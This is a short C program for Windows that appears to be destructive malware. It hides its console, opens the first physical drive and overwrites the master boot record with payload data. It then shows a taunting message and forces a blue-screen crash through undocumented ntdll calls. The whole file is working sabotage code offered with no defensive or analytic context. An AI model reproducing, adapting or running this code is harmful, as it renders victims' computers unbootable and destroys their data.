#include <windows.h>
#include "exported.h"
int main()
{
	FreeConsole(); //Hide the console.
	DWORD dw;
	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	//Now we have a handle to our dear MBR.
	//We're going now to overwrite it...
	//Write the mbrData data to hDrive.
	WriteFile(hDrive, mbrData, sizeof(mbrData), &dw, NULL);
	//DONE!
	//Now let's close the handle...
	CloseHandle(hDrive);
	//Show a message box.
	MessageBox(NULL, "Your MBR has been overwritten!!!", "NOTIFICATION", MB_OK | MB_ICONERROR);
	//If the user clicks OK, cause BSOD.
	//Credit: Leurak
	HMODULE ntdll = LoadLibraryA("ntdll"); //Load the NTDLL library.
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2); //Now cause BSOD.
	}
	return 0;
}
